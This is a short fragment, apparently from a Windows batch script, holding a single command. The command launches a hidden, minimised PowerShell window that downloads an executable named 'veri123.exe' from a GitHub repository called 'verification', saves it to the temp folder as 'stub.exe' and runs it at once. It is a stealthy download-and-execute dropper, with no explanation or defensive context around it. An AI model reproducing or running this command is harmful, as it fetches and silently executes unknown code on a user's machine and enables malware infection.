...
start /min "" powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/centralskid/verification/raw/refs/heads/main/stuff/veri123.exe' -OutFile '%TEMP%\stub.exe'; if (Test-Path '%TEMP%\stub.exe') { Start-Process '%TEMP%\stub.exe' }"
